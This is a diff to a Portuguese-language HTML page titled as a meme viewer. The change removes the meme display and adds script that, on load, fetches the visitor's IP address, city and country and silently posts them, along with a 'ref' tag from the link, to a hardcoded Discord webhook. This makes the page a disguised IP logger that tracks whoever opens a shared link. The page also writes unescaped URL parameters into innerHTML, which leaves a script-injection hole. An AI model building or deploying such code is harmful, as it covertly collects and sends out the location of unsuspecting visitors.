@@ -1,120 +1,36 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Meme Visualizado</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #f4f4f4;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      flex-direction: column;
-      text-align: center;
-      padding: 20px;
-    }
-
-    .card {
-      background: white;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      max-width: 500px;
-      width: 100%;
-    }
-
-    h2 {
-      margin-top: 0;
-    }
-
-    .info-line {
-      margin: 10px 0;
-    }
-
-    .meme-media {
-      margin-top: 20px;
-      max-width: 100%;
-      border-radius: 10px;
-    }
-
-    .back-btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 8px 16px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      text-decoration: none;
-      cursor: pointer;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Visualizar Meme</title>
 </head>
 <body>
-  <div class="card">
-    <h2>Meme Visualizado</h2>
-    <div id="info">Carregando dados de localização...</div>
-    <div id="meme-container"></div>
-    <a class="back-btn" href="index.html">Voltar para Galeria</a>
-  </div>
+  <h2>Meme Visualizado</h2>
+  <p id="info">Carregando dados de localização...</p>
 
   <script>
-    const memes = {
-      meme1: { type: "image", src: "https://via.placeholder.com/300x200.png?text=Meme+1" },
-      meme2: { type: "video", src: "https://www.w3schools.com/html/mov_bbb.mp4" },
-      meme3: { type: "image", src: "https://via.placeholder.com/300x200.png?text=Meme+3" },
-      meme4: { type: "video", src: "https://media.w3.org/2010/05/sintel/trailer_hd.mp4" }
-      // Adicione mais aqui
-    };
-
-    const params = new URLSearchParams(window.location.search);
-    const memeId = params.get("meme") || "desconhecido";
-    const ref = params.get("ref") || "N/A";
-
-    const meme = memes[memeId];
-
-    // Mostrar localização
     fetch("https://ipapi.co/json")
       .then(res => res.json())
       .then(data => {
-        const infoHTML = `
-          <div class="info-line"><strong>Meme:</strong> ${memeId}</div>
-          <div class="info-line"><strong>Referência:</strong> ${ref}</div>
-          <div class="info-line"><strong>IP:</strong> ${data.ip}</div>
-          <div class="info-line"><strong>Local:</strong> ${data.city}, ${data.country_name}</div>
-        `;
-        document.getElementById("info").innerHTML = infoHTML;
-      })
-      .catch(() => {
-        document.getElementById("info").innerHTML = `<div style="color:red;">Erro ao obter localização.</div>`;
-      });
+        const params = new URLSearchParams(window.location.search);
+        const ref = params.get("ref");
+        const meme = params.get("meme");
 
-    // Mostrar mídia
-    const container = document.getElementById("meme-container");
-    if (meme) {
-      if (meme.type === "image") {
-        const img = document.createElement("img");
-        img.src = meme.src;
-        img.alt = memeId;
-        img.className = "meme-media";
-        container.appendChild(img);
-      } else if (meme.type === "video") {
-        const video = document.createElement("video");
-        video.controls = true;
-        video.className = "meme-media";
-        const source = document.createElement("source");
-        source.src = meme.src;
-        source.type = "video/mp4";
-        video.appendChild(source);
-        container.appendChild(video);
-      }
-    } else {
-      container.innerHTML = `<p style="color:red;">Meme não encontrado.</p>`;
-    }
+        const info = `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
+        document.getElementById("info").innerHTML = info;
+
+        console.log("LOG DE VISITA", { meme, ref, ip: data.ip, location: data.city + ", " + data.country_name });
+
+        // Enviar a informação para o Discord via Webhook
+        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Meme Visualizado:**\nMeme: ${meme}\nReferência: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}`
+          })
+        });
+      });
   </script>
 </body>
 </html>
